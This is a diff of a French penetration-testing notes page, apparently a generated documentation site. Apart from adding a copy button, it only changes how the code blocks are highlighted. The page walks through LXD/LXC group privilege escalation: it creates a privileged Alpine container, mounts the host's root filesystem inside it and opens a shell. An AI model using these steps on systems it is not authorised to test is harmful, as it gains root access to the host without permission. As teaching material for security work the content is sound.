@@ -7605,24 +7605,24 @@
 
 <p>Si notre utilisateur est membre du groupe lxd / lxc, il est possible de créer un conteneur. Cela nous donne la possibilité d'être root sur ce conteneur, de monter la racine de l'host à l'intérieur du conteneur et donc de le lire avec les droits root.</p>
 <p>Télécharger une image de conteneur Alpine Linux :</p>
-<pre><code class="language-bash">wget https://dl-cdn.alpinelinux.org/alpine/v3.17/releases/x86_64/alpine-minirootfs-3.17.1-x86_64.tar.gz
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>wget<span class="w"> </span>https://dl-cdn.alpinelinux.org/alpine/v3.17/releases/x86_64/alpine-minirootfs-3.17.1-x86_64.tar.gz
+</span></code></pre></div>
 <p>Initialiser LXD au besoin:</p>
-<pre><code class="language-bash">lxd init
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>lxd<span class="w"> </span>init
+</span></code></pre></div>
 <p>Importer l'image Alpine comme une image LXC :</p>
-<pre><code class="language-bash">lxc image import alpine-minirootfs-3.17.1-x86_64.tar.gz --alias alpine
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>lxc<span class="w"> </span>image<span class="w"> </span>import<span class="w"> </span>alpine-minirootfs-3.17.1-x86_64.tar.gz<span class="w"> </span>--alias<span class="w"> </span>alpine
+</span></code></pre></div>
 <p>Lancer un conteneur Alpine avec des privilèges élevés :</p>
-<pre><code class="language-bash">lxc init alpine r00t -c security.privileged=true`
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>lxc<span class="w"> </span>init<span class="w"> </span>alpine<span class="w"> </span>r00t<span class="w"> </span>-c<span class="w"> </span>security.privileged<span class="o">=</span><span class="nb">true</span><span class="sb">`</span>
+</span></code></pre></div>
 <p>Monter le disque de l'hôte dans le conteneur :</p>
-<pre><code class="language-bash">lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true`
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>lxc<span class="w"> </span>config<span class="w"> </span>device<span class="w"> </span>add<span class="w"> </span>r00t<span class="w"> </span>mydev<span class="w"> </span>disk<span class="w"> </span><span class="nv">source</span><span class="o">=</span>/<span class="w"> </span><span class="nv">path</span><span class="o">=</span>/mnt/root<span class="w"> </span><span class="nv">recursive</span><span class="o">=</span><span class="nb">true</span><span class="sb">`</span>
+</span></code></pre></div>
 <p>Accéder au shell dans le conteneur :</p>
-<pre><code class="language-bash">lxc start r00t
-lxc exec r00t /bin/sh
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>lxc<span class="w"> </span>start<span class="w"> </span>r00t
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>lxc<span class="w"> </span><span class="nb">exec</span><span class="w"> </span>r00t<span class="w"> </span>/bin/sh
+</span></code></pre></div>
 
 
 
@@ -7669,7 +7669,7 @@ lxc exec r00t /bin/sh
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections"], "search": "../../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections", "content.code.copy"], "search": "../../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../../../../assets/javascripts/bundle.fe8b6f2b.min.js"></script>
